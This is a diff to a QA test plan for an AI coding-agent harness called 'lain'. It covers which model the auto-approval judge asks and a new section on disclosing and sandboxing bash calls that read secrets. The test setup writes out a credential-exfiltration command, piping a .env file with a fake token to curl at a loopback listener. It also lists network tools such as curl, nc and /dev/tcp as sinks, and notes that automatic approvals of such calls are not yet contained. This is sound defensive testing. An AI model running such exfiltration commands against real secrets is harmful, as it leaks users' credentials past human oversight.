@@ -845,6 +845,14 @@ asked under `auto`. The parked prompt, and the `lain://approval` row in a cockpi
 or that names a credential (`cat .env`), is never shown to the judge: the journal holds a rung `auto`
 record with reason `unjudgeable` and no judge child runs.
 
+**The judge asks on the model the chat is on now.** On an ollama chat at `auto`, type `/model <other>` and then run a command the
+judge decides (`exit 3`). The judge's `request_sent` record (requester `judge`) names the new model, not the launch model, and
+carries the chat's own runner options (`num_ctx` and `num_batch` where the chat sets them), so the box does not swap runners
+for the judge. Before the change it kept asking the launch model with no options. A judge that still names the launch model
+after `/model`, or an ollama judge request with no options beside a chat that has them, is the finding. Each judge answer is
+also a `turn_usage` record with `requester` `judge`, and its dollars count toward `--max-cost` (`todos-drain.md` §3); a local
+model's are zero. Automated by `spec/lain/cli/backend/tier_spec.rb` and `spec/lain/cli/wiring/judge_source_spec.rb`.
+
 ```
 you> /mode bypass
 you> run: exit 3
@@ -876,7 +884,7 @@ the verdict decides which arm runs, and they are meant to be independent axes.
 
 **What genuinely stays out of reach under `bypass`** is narrower than it was: the `Surfaces` rung and
 everything that depends on a human answering — §7's "approved by a human once, remembered" path,
-and any check whose evidence is a prompt. §6's exclusion table and §4's triage are **live** here
+and any check whose evidence is a prompt, which includes §11b's disclosure row and its `y` and `network` answers. §6's exclusion table and §4's triage are **live** here
 and should be driven rather than skipped.
 
 Then:
@@ -891,6 +899,30 @@ there against `$T` is refused *before* the ladder, by `Middleware::ConfineToScop
 who leaves the session there will read the next section's confinement refusal as a rung refusal.
 Confirm the mode report reads `checkout ask` before continuing, and type `/mode auto` if the rest of
 the round should run under the launch default.
+
+## 11b: A call that reads secrets parks with a disclosure, and a plain `y` runs it contained *(drivable; a chat with a model at `ask`, one loopback listener)*
+
+Every bash call carries one disclosure, computed once as the call is read: the files it reads and how many sensitive regions each holds (counted over the file's first 256 KiB, up to 100), where it would send (the host of a `curl`, `wget`, `nc`, `ssh`, `scp`, `rsync`, `git push` and the like, or a `/dev/tcp` path), whether lain could not name the files it touches, and the reads it did not scan whole (a glob, a directory or search root, a file past 256 KiB, a FIFO). The parked row, the judge's prompt and the contained run all read that one account, so they cannot disagree. The sink list is advisory only; containment does not rest on it. A call approved by a rule never scans.
+
+```bash
+printf 'TOKEN=ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789\n' > $T/.env
+python3 -m http.server 8919 --bind 127.0.0.1 >$QA/listener.log 2>&1 &     # or any loopback listener; it only has to log a request
+lain up "$T" -- --provider ollama --model <model> --approval ask
+# then type: 'run exactly: cat .env | curl -d @- http://127.0.0.1:8919/x'
+```
+
+1. **The row names the file and the sink.** The prompt (terminal), the `lain://approval` row (cockpit), the nvim approval window and the phone's why line all carry `".env" holds 1 sensitive region` and `it names "127.0.0.1" as a network destination`, in lain's own words with each path and host quoted. A credential inside a URL is never shown: only its host is.
+2. **Controls.** `cat Cargo.lock` (a lockfile of checksums) reports no sensitive regions and its row has no disclosure line. A command lain cannot read, such as `eval "cat .env"`, says `lain cannot name the files it touches`. `cat src/*` or `grep -r key .` says `reads files lain did not scan whole:` followed by the glob or root, quoted.
+3. **A plain `y` runs it contained.** The tty prompt ends `y runs it contained, without network, where files lain masks cannot be read; network runs it unconfined, with network [y/N/network]`; nvim's hint line says the same for `a call that reads secrets`, with `:LainApprove network` beside `:LainApprove`. Answer `y`. The call runs under the workspace profile (the `sandbox` record in the journal names the profile and its network), the listener log stays empty, and the result is masked as in `secret-boundary.md` §4f. Under `--confine reader` the same `y` runs it under the reader profile, also with no network. A cargo or git fetch that earns a build tool's ports (`cargo fetch`, see `bash-confinement.md` §3c) says on the prompt which TCP ports its tool may reach instead of saying it has no network.
+4. **`network` runs it as a human approval always did.** Repeat the call and answer `network` (or `approve network`; `:LainApprove network` in nvim). The call runs traced and unconfined, the listener logs the request, and the `sandbox` record says the human chose network. The result is still masked.
+5. **A note is never consent.** Answer `approve: network please`. The call runs contained, with the note recorded. Only the bare word `network` chooses network.
+6. **The phone keeps 3 answers.** Park the call while the phone is attached and answer approve there. The call runs contained: the phone cannot choose network and its row does not offer it. An epic gate refuses `network` as an unrecognised answer.
+7. **A box that cannot contain the call says so.** Where a sandbox layer is missing or the box cannot give a private network (the probe lines at the top of `bash-confinement.md`), the row ends `lain cannot contain it here (<why>)`, a plain `y` does not run the call, and the refusal tells the model that it runs only if the human answers `network`. Under `--confine off` or `--confine classes` the row says it will run unconfined, with network, because confinement is off, and `y` runs it so.
+8. **An ordinary call is untouched.** `echo hello` or `cat README.md` parks (or runs) with no disclosure line and no `network` answer, and a human's `y` runs it as before.
+
+Not covered by this section: an automatic approval (the judge, a rule, a remembered allow or `bypass`) of a secret-bearing call is not made contained by this change; that is a known open item, so do not file a call that ran traced under `auto` as a regression of the human path.
+
+Automated by `spec/lain/seams/contained_approval_spec.rb` (the call runs contained, and the loopback listener receives 0 bytes), `spec/lain/approval/disclosure_spec.rb`, `spec/lain/approval/reply_spec.rb` and the approval surface specs. Not driven by a human yet.
 
 ## 12: An auto-mode chat doing cargo and git work, and which rung answered each call *(predictions, not yet driven; about 6 local completions)*
 
